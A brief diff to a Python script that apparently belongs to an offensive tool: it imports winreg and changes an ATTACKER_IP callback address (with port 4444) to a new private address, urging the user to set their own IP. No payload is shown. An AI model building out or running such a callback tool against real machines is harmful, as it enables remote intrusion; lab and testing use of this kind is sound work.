@@ -9,7 +9,7 @@ import sys
 import winreg
 from datetime import datetime
 
-ATTACKER_IP = "192.168.56.1"  # CHANGE THIS TO YOUR IP!
+ATTACKER_IP = "10.11.73.46"  # CHANGE THIS TO YOUR IP!
 ATTACKER_PORT = 4444
 
 # LOG FILE LOCATION - Using multiple locations for reliability
